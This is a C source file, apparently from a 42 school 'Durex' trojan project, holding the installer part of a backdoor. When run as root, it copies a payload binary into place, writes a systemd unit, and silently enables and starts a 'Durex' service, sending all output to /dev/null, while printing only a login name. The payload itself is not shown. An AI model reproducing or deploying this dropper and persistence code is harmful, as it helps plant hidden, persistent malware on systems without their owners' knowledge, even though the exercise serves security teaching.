/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: eparisot <eparisot@42.student.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/05/25 14:55:42 by eparisot          #+#    #+#             */
/*   Updated: 2021/05/25 14:55:42 by eparisot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/durex.h"

static int read_obj(char *file_name, void **obj, size_t *obj_size)
{
	int payload_fd;

	if ((payload_fd = open(file_name, O_RDONLY)) < 0)
	{
		(DEBUG) ? printf("Error %d opening '%s' file.\n", payload_fd, file_name) : 0;
		return (-1);
	}
	if ((*obj_size = lseek(payload_fd, (size_t)0, SEEK_END)) <= 0)
	{
		(DEBUG) ? printf("Error empty '%s' file\n", file_name) : 0;
		close(payload_fd);
		return (-1);
	}
	if ((*obj = mmap(0, *obj_size, PROT_READ, MAP_PRIVATE, payload_fd, 0)) == \
			MAP_FAILED)
	{
		(DEBUG) ? printf("Error mapping '%s' file\n", file_name) : 0;
		close(payload_fd);
		return (-1);
	}
	close(payload_fd);
	return 0;
}

static int create_file()
{
	// creates a Durex file
	int durex_fd;

	if ((durex_fd = open(BIN_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
	{
		(DEBUG) ? printf("Error %d creating 'Durex' file.\n", durex_fd) : 0;
		return (-1);
	}
	// read payload content
	void *obj = NULL;
	size_t obj_size = 0;
	// read payload
	// TODO use hardcoded code
	if (read_obj(PAYLOAD_SRC, &obj, &obj_size))
	{
		close(durex_fd);
		return (-1);
	}
	// write content
	write(durex_fd, obj, obj_size);
	// tmp
	if (munmap(obj, obj_size) < 0)
		(DEBUG) ? printf("Error munmap\n") : 0;
	close(durex_fd);
	return 0;
}

static int init_d()
{
	int init_fd = 0;
	void *obj = NULL;
	size_t obj_size = 0;

	if ((init_fd = open(INIT_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0644)) < 0)
	{
		return -1;
	}
	// read init file content
	// TODO use hardcoded code
	if (read_obj(INIT_SRC, &obj, &obj_size))
	{
		close(init_fd);
		return -1;
	}
	// write content
	write(init_fd, obj, obj_size);
	// tmp
	if (munmap(obj, obj_size) < 0)
		(DEBUG) ? printf("Error munmap\n") : 0;
	close(init_fd);
	// reload systemd
	system("systemctl enable Durex.service 1>/dev/null 2>/dev/null");
	system("systemctl start  Durex.service 1>/dev/null 2>/dev/null");
	return 0;
}

int main(void)
{
	// check sudo
	if (getuid() == 0)
	{
		create_file();
		init_d();
		printf("eparisot\n");
	}
	else
	{
		(DEBUG) ? printf("Insufficient Permissions, please re-run as root.\n") : 0;
	}
	return 0;
}